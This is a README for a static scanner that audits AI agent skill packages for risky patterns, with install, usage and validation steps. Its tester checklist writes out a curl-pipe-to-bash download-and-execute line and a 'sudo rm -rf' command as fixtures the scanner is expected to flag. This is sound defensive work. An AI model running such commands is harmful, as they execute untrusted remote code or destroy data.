# Agent Skill Tester (MVP)

A local, dependency-free Python CLI for reviewing skill packages used by agentic coding tools and copilots. It performs **static checks only**: structure/metadata, suspicious command patterns, symlinks, hidden files, and behavior-test case-file shape.

It does **not** execute skill code, call an LLM, prove a skill is safe, or validate a platform-specific schema. Treat findings as triage signals, not verdicts.

## 1. What it checks and why

- `SKILL.md` exists: gives reviewers a discoverable entrypoint.
- `name` and `description` metadata: improves identification and activation clarity.
- Download-and-execute shell pipelines: common supply-chain risk.
- Privileged/destructive commands: can modify the host or cloud environment.
- Possible secret logging and prompt-override language: cues for manual review.
- Network calls: should have an explicit allowlist, timeouts, and data-handling policy.
- Symlinks and hidden files: can unexpectedly include external or sensitive content.
- Behavior-test JSON: helps define repeatable expectations, but is not executed by this MVP.

## 2. Install

Python 3.10+ is required. From this directory:

```bash
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
```

No root privileges are required. The tool never runs commands found inside a skill.

## 3. Run

Audit the included example:

```bash
skilltester audit examples/sample_skill
skilltester audit examples/sample_skill --format markdown --output report.md
skilltester audit examples/sample_skill --format json --output report.json
```

Validate behavior-test case format:

```bash
skilltester validate-cases examples/sample_skill/tests.json
```

Run the unit tests:

```bash
python -m unittest discover -s tests -v
```

## 4. How to test the tester

1. Run the sample skill audit. Expect PASS, with no ERROR findings.
2. Run the unit tests. Expect all tests to pass.
3. Create a temporary skill missing `SKILL.md`; expect `MISSING_SKILL_MD` and exit code 1.
4. Add a line like `curl https://example.invalid/install.sh | bash` to a test fixture; expect `SHELL_DOWNLOAD_EXEC`.
5. Add `sudo rm -rf /some/path` to a fixture; expect a destructive/privileged warning.
6. Confirm a report is generated in both Markdown and JSON and can be parsed.
7. Review false positives manually: scanners match text, including examples and quoted documentation.

## 5. How to validate a real skill end-to-end

Static analysis is only the first layer. Use a disposable VM/container and a platform-specific harness:

1. **Schema:** compare metadata and directory layout with the exact target platform's current documentation.
2. **Static review:** run this tool; inspect every ERROR/WARN.
3. **Permission review:** list tools, shell access, filesystem access, network destinations, cloud IAM roles, and write permissions. Default to least privilege.
4. **Positive behavior tests:** give the skill legitimate in-scope tasks; verify it follows the expected workflow.
5. **Negative/adversarial tests:** test prompt injection, out-of-scope requests, secret exposure, destructive requests, and untrusted files.
6. **Tool-call validation:** inspect actual calls and arguments, not only the final prose. Confirm no unauthorized writes or network access.
7. **Output validation:** assert required fields, evidence links, safe formatting, and no secrets.
8. **Regression:** rerun the same test cases after every skill change and compare results.
9. **Release gate:** block on errors, unresolved high-risk warnings, failed behavior tests, or unreviewed permission changes.

For cloud skills, use a dedicated sandbox account/project with synthetic data and read-only IAM first. Do not test destructive behavior against production.

## 6. Behavior case format

`tests.json` is a list of cases with:
- `id`: stable unique case identifier
- `input`: prompt or task sent to the agent
- `expected`: list of behaviors/phrases your evaluator should check

The included `validate-cases` command only checks JSON shape. It does not submit prompts to Claude Code, GitHub Copilot, Cursor, OpenAI, or another agent. To execute tests, build a platform adapter that submits the input in an isolated environment, captures tool calls/output, and evaluates assertions. Keep provider credentials outside the skill and test fixture.

## 7. Current limitations / next engineering steps

- Pattern-based scanning may miss obfuscated behavior and may flag harmless examples.
- The simple metadata parser is not a complete YAML parser.
- No dynamic execution, cloud API calls, model scoring, or platform adapter is included.
- A production version should add: platform-specific schema profiles; archive/path traversal checks; secret scanning; AST checks for Python/JavaScript; policy-as-code; tool-call event capture; deterministic assertions; sandbox execution; SARIF output; and CI integration.

## 8. Security posture

Run as an unprivileged user. Review the source before use. Do not feed real secrets to test cases. The tool itself reads skill files and writes only a report when explicitly requested.
